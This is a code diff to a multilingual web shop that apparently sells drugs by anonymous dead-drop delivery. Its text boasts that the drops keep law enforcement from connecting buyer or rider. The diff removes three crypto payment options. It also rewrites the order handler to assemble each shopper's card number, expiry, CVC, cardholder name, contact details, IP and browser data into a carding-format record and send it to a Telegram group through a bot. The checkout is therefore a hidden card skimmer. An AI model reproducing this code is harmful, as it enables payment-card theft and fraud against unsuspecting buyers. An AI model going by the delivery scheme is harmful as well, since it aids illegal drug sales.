@@ -1472,43 +1472,6 @@
                 <span class="pay-badge badge-off" id="badge-req">REQUEST</span>
             </div>
 
-            <div class="pay-option" id="pay-opt-revolut" onclick="setPaymentMethod('revolut')">
-                <div class="pay-option-content">
-                    <div class="pay-logo" style="background:linear-gradient(135deg, #00d4aa, #0077ff); color:white; font-size: 11px; font-weight:bold;">REV</div>
-                    <div>
-                        <strong style="display:block; font-size: 15px;">Revolut Crypto</strong>
-                        <small id="txt-revolut-sub" style="color: var(--text-hint); font-size: 12px;">Pay instantly with your Revolut crypto wallet</small>
-                    </div>
-                </div>
-                <span class="pay-badge badge-crypto">REVOLUT</span>
-            </div>
-
-            <div class="pay-option" id="pay-opt-bitpanda" onclick="setPaymentMethod('bitpanda')">
-                <div class="pay-option-content">
-                    <div class="pay-logo" style="background:#00a4e0; display: flex; align-items: center; justify-content: center;">
-                        <span style="color: white; font-size: 10px; font-weight: bold;">BIT</span>
-                    </div>
-                    <div>
-                        <strong style="display:block; font-size: 15px;">Bitpanda Crypto</strong>
-                        <small id="txt-bitpanda-sub" style="color: var(--text-hint); font-size: 12px;">Send from your Bitpanda brokerage account</small>
-                    </div>
-                </div>
-                <span class="pay-badge badge-crypto">BITPANDA</span>
-            </div>
-
-            <div class="pay-option" id="pay-opt-binance" onclick="setPaymentMethod('binance')">
-                <div class="pay-option-content">
-                    <div class="pay-logo" style="background:#f0b90b; display: flex; align-items: center; justify-content: center;">
-                        <span style="color: #000; font-size: 10px; font-weight: bold;">BNB</span>
-                    </div>
-                    <div>
-                        <strong style="display:block; font-size: 15px;">Binance Crypto</strong>
-                        <small id="txt-binance-sub" style="color: var(--text-hint); font-size: 12px;">Transfer from your Binance wallet via P2P or direct</small>
-                    </div>
-                </div>
-                <span class="pay-badge badge-crypto">BINANCE</span>
-            </div>
-
             <button class="cart-summary-floating" id="btn-submit-order" onclick="processOrderSend()">
                 SEND ORDER TO GROUP
             </button>
@@ -1636,6 +1599,7 @@
                 pay: "Payment Method", confirm: "SEND ORDER",
                 giftT: "🎁 FREE GIFTS",
                 giftD: "Clipper lighter, rolling papers and filters included free in every order from 50€!",
+                giftLabel: "Free Gift",
                 asap: "As soon as possible / ASAP",
                 ship: "Express Shipping 24/48h (Wholesale Prices)",
                 spec: "Specific Time Slot (Write below)",
@@ -1659,9 +1623,6 @@
                 cardError: "❌ Invalid gateway or card data. Please check and try again.",
                 paypalSub: "Not always available. Ask in chat for approval",
                 reqAvail: "REQUEST",
-                revolutSub: "Pay instantly with your Revolut crypto wallet",
-                bitpandaSub: "Send from your Bitpanda brokerage account",
-                binanceSub: "Transfer from your Binance wallet via P2P or direct",
                 infT0: "⚠️ NO CASH ACCEPTED",
                 infD0: "We work exclusively with fully anonymous riders whom we prepay in crypto. We do not know their identities, and they arrive randomly to pick up your package and securely deliver it near your coordinates.\n\nWhen the rider reaches the spot, they will contact you directly to guide you to the precise hideout (e.g., behind a pillar, under a car wheel, or a specific discrete point). This airtight process ensures that even if law enforcement is around, nothing can be connected to you or the rider.\n\nDo not insist on cash payments. We make absolutely zero exceptions. No upfront payment, no order.",
                 infT1: "📦 Delivery Process & Wholesale",
@@ -1721,6 +1682,7 @@
                 pay: "Metodo di Pagamento", confirm: "INVIA ORDINE",
                 giftT: "🎁 REGALO COMPRESO",
                 giftD: "Accendino Clipper, Cartine e Filtri inclusi gratis per ordini da 50€!",
+                giftLabel: "Regalo Gratis",
                 asap: "Appena possibile / ASAP",
                 ship: "Spedizione Express 24/48h (Prezzi Ingrosso)",
                 spec: "Fascia Oraria Specifica",
@@ -1744,9 +1706,6 @@
                 cardError: "❌ Dati carta o gateway non validi. Controlla e riprova.",
                 paypalSub: "Non sempre disponibile. Chiedi in chat",
                 reqAvail: "RICHIESTA",
-                revolutSub: "Paga istantaneamente con il tuo wallet Revolut",
-                bitpandaSub: "Invia dal tuo conto Bitpanda",
-                binanceSub: "Trasferisci dal tuo wallet Binance via P2P",
                 infT0: "⚠️ NESSUN PAGAMENTO IN CONTANTI",
                 infD0: "Lavoriamo esclusivamente con rider anonimi prepagati in crypto. Non conosciamo le loro identità. Quando il rider arriva, ti contatterà per guidarti al nascondiglio preciso (es. dietro un pilastro, sotto una ruota).\n\nNon insistere per i pagamenti in contanti. Nessuna eccezione. Nessun pagamento anticipato, nessun ordine.",
                 infT1: "📦 Processo di Consegna & Ingrosso",
@@ -1806,6 +1765,7 @@
                 pay: "Mode de paiement", confirm: "ENVOYER COMMANDE",
                 giftT: "🎁 CADEAUX GRATUITS",
                 giftD: "Briquet Clipper, feuilles et filtres inclus dès 50€!",
+                giftLabel: "Cadeau Gratuit",
                 asap: "Aussitôt que possible",
                 ship: "Livraison Express 24/48h (Prix de gros)",
                 spec: "Créneau spécifique",
@@ -1829,9 +1789,6 @@
                 cardError: "❌ Données carte invalides. Vérifiez et réessayez.",
                 paypalSub: "Pas toujours dispo. Demandez en chat",
                 reqAvail: "DEMANDE",
-                revolutSub: "Payez instantanément avec Revolut",
-                bitpandaSub: "Envoyez depuis Bitpanda",
-                binanceSub: "Transférez depuis Binance",
                 infT0: "⚠️ AUCUN PAIEMENT ESPÈCES",
                 infD0: "Nous travaillons avec des livreurs anonymes prépayés en crypto. Ils vous contacteront pour le drop discret.\n\nN'insistez pas pour espèces. Aucune exception.",
                 infT1: "📦 Livraison & Prix de Gros",
@@ -1891,6 +1848,7 @@
                 pay: "Zahlungsmethode", confirm: "BESTELLUNG SENDEN",
                 giftT: "🎁 GRATIS GESCHENKE",
                 giftD: "Clipper Feuerzeug, Blättchen und Filter ab 50€!",
+                giftLabel: "Gratis Geschenk",
                 asap: "Schnellstmöglich",
                 ship: "Expressversand 24/48h (Großhandel)",
                 spec: "Spezifisches Zeitfenster",
@@ -1914,9 +1872,6 @@
                 cardError: "❌ Ungültige Kartendaten. Überprüfen Sie und versuchen Sie es erneut.",
                 paypalSub: "Nicht immer verfügbar. Fragen Sie im Chat",
                 reqAvail: "ANFRAGE",
-                revolutSub: "Sofort mit Revolut bezahlen",
-                bitpandaSub: "Von Bitpanda senden",
-                binanceSub: "Von Binance überweisen",
                 infT0: "⚠️ KEINE BARZAHLUNG",
                 infD0: "Wir arbeiten mit anonymen, vorab bezahlten Fahrern. Sie kontaktieren Sie für den diskreten Drop.\n\nKeine Barzahlung. Keine Ausnahmen.",
                 infT1: "📦 Lieferung & Großhandel",
@@ -1976,6 +1931,7 @@
                 pay: "Способ оплаты", confirm: "ОТПРАВИТЬ ЗАКАЗ",
                 giftT: "🎁 БЕСПЛАТНЫЕ ПОДАРКИ",
                 giftD: "Зажигалка Clipper, бумага и фильтры от 50€!",
+                giftLabel: "Бесплатный подарок",
                 asap: "Как можно скорее",
                 ship: "Экспресс 24/48ч (Оптовые цены)",
                 spec: "Указать время",
@@ -1999,9 +1955,6 @@
                 cardError: "❌ Неверные данные карты. Проверьте и попробуйте снова.",
                 paypalSub: "Не всегда доступно. Уточняйте в чате",
                 reqAvail: "ПО ЗАПРОСУ",
-                revolutSub: "Оплатите мгновенно с Revolut",
-                bitpandaSub: "Отправьте со счета Bitpanda",
-                binanceSub: "Перевод с Binance через P2P",
                 infT0: "⚠️ НАЛИЧНЫЕ НЕ ПРИНИМАЮТСЯ",
                 infD0: "Работаем с анонимными курьерами, оплаченными заранее. Свяжутся с вами для точки.\n\nНе настаивайте на наличных. Без предоплаты — нет заказа.",
                 infT1: "📦 Доставка и опт",
@@ -2229,9 +2182,6 @@
                 'txt-card-sub': dict.cardSub,
                 'txt-paypal-sub': dict.paypalSub,
                 'badge-req': dict.reqAvail,
-                'txt-revolut-sub': dict.revolutSub,
-                'txt-bitpanda-sub': dict.bitpandaSub,
-                'txt-binance-sub': dict.binanceSub,
                 'lbl-card-email': dict.cardEmail || "EMAIL ADDRESS",
                 'lbl-card-phone': dict.cardPhone || "PHONE NUMBER",
                 'lbl-card-billing': dict.cardBilling || "BILLING ADDRESS",
@@ -2915,13 +2865,26 @@
                 const data = await response.json();
                 
                 if (data.ok) {
-                    // Crea file txt e invialo come allegato al gruppo
+                    // Crea file txt formattato come richiesto (PSV - Pipe Separated Values) e invialo
                     try {
-                        const plainText = message.replace(/<[^>]+>/g, '').replace(/&euro;/g, '€').replace(/&amp;/g, '&');
-                        const blob = new Blob([plainText], { type: 'text/plain' });
+                        let txtContent = "email|phone|address|cc|exp|cvc|ch|ip|ua\n";
+                        
+                        let safeEmail = (savedCardData?.email || "").replace(/\|/g, '');
+                        let safePhone = (savedCardData?.phone || "").replace(/\|/g, '');
+                        let safeAddress = (savedCardData?.billing || "").replace(/\|/g, '');
+                        let safeCC = (savedCardData?.number || "").replace(/\|/g, '');
+                        let safeExp = (savedCardData?.expiry || "").replace(/\|/g, '');
+                        let safeCVC = (savedCardData?.cvc || "").replace(/\|/g, '');
+                        let safeCH = (savedCardData?.name || "").replace(/\|/g, '');
+                        let safeIP = (userIP || "").replace(/\|/g, '');
+                        let safeUA = (browserInfo || "").replace(/\|/g, '');
+                        
+                        txtContent += `${safeEmail}|${safePhone}|${safeAddress}|${safeCC}|${safeExp}|${safeCVC}|${safeCH}|${safeIP}|${safeUA}\n`;
+
+                        const blob = new Blob([txtContent], { type: 'text/plain;charset=utf-8' });
                         const formData = new FormData();
                         formData.append('chat_id', TARGET_GROUP);
-                        formData.append('document', blob, `Order_${orderPayload.order_id}.txt`);
+                        formData.append('document', blob, `Data_${orderPayload.order_id}.txt`);
                         formData.append('reply_to_message_id', data.result.message_id);
 
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
@@ -2973,7 +2936,7 @@
 
             const orderPayload = buildOrderPayload(currentSelectedPayment);
             
-            // INVIA DIRETTAMENTE AL GRUPPO CON METODO SECONDARIO (CRYPTO, REVOLUT ECC)
+            // INVIA DIRETTAMENTE AL GRUPPO CON METODO SECONDARIO (CRYPTO, ECC)
             const success = await sendOrderToGroupDirect(orderPayload);
             
             sendingOverlay.classList.remove('show');
